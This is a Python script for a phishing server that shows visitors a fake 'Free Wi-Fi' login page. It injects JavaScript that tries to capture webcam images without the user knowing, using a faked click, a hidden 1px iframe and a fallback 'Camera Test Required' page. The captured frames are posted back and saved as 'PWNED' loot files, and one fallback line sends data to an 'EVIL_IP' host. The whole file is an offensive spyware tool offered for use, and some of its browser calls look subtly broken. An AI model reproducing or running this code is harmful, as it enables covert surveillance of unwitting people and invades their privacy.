#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import base64
import os
from datetime import datetime

PORT = 80
DIR = "HACKED"
os.makedirs(DIR, exist_ok=True)

# === SPICY PAYLOAD: AUTO-CLICK + WEBRTC + FALLBACK ===
PAYLOAD = """
<script>
// AUTO-CLICK HACK: Simulate user tap to bypass gesture requirement
setTimeout(() => {
  const clickEvent = new Event('click', {bubbles: true});
  document.body.dispatchEvent(clickEvent);
}, 100);

// CHAIN OF DEATH: Try multiple vectors
const steal = async () => {
  const send = (b64) => {
    fetch('', {method:'POST', body:'img='+b64}).then(() => {
      setTimeout(() => location='https://google.com', 300);
    });
  };

  const snap = (stream) => {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.muted = true;
    video.play();
    return new Promise(res => {
      video.onloadedmetadata = () => {
        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 1280;
          canvas.height = video.videoHeight || 720;
          canvas.getContext('2d').drawImage(video, 0, 0);
          const b64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
          stream.getTracks().forEach(t => t.stop());
          res(b64);
        }, 800);
      };
    });
  };

  // VECTOR 1: Direct (if perms exist)
  try {
    const s = await navigator.mediaDevices.getUserMedia({video: true});
    send(await snap(s));
    return;
  } catch(e) {}

  // VECTOR 2: Picture-in-Picture (bypasses some blocks)
  try {
    const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
    const track = s.getVideoTracks()[0];
    const pip = await track.requestPictureInPicture?.();
    if (pip) {
      const img = new Image();
      img.src = await pip.getVideoFrame?.() || '';
      send(btoa(img.src));
    }
  } catch(e) {}

  // VECTOR 3: Iframe + hidden video (stealth)
  const iframe = document.createElement('iframe');
  iframe.style = 'position:fixed;opacity:0;width:1px;height:1px;';
  document.body.appendChild(iframe);
  iframe.contentWindow.navigator.mediaDevices.getUserMedia({video:true})
    .then(s => snap(s).then(send))
    .catch(() => {});

  // VECTOR 4: Fallback - redirect to fake camera test page
  setTimeout(() => {
    location = 'data:text/html,<h1>Camera Test Required</h1><script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>{'+'fetch("http://EVIL_IP/cam", {method:"POST",body:new Blob([s.getTracks()[0].getSettings().deviceId])})}</script>';
  }, 5000);
};
steal();
</script>
"""

class HyperHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Fake "Wi-Fi Login" page
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <title>Wi-Fi Login Required</title>
          <style>
            body {{background:#0d1b2a; color:#fff; font-family:sans-serif; text-align:center; padding:10%;}}
            .box {{background:#1b263b; padding:2rem; border-radius:12px; max-width:400px; margin:auto;}}
            button {{background:#e63946; color:white; border:none; padding:1rem; font-size:1.2rem; border-radius:8px; width:100%; margin-top:1rem;}}
          </style>
        </head>
        <body>
          <div class="box">
            <h2>Free Wi-Fi</h2>
            <p>Tap below to connect</p>
            <button onclick="document.body.click()">Connect Now</button>
            {PAYLOAD.replace('EVIL_IP', self.client_address[0])}
          </div>
        </body>
        </html>
        """
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode()
        img = urllib.parse.parse_qs(data).get('img', [''])[0]

        if img and len(img) > 1000:
            ts = datetime.now().strftime("%H%M%S")
            path = f"{DIR}/PWNED_{ts}_{self.client_address[0]}.jpg"
            with open(path, "wb") as f:
                f.write(base64.b64decode(img))
            print(f"ðŸ”¥ PWNED: {path} | {self.client_address[0]}")
        else:
            print(f"[-] Ghost hit from {self.client_address[0]}")

        self.send_response(303)
        self.send_header("Location", "https://google.com")
        self.end_headers()

print("ðŸ’€ HYPERSTEALTH SERVER ARMED")
print("   URL: http://YOUR_IP")
print("   LOOT â†’ ./HACKED/")
socketserver.TCPServer(("", PORT), HyperHandler).serve_forever()
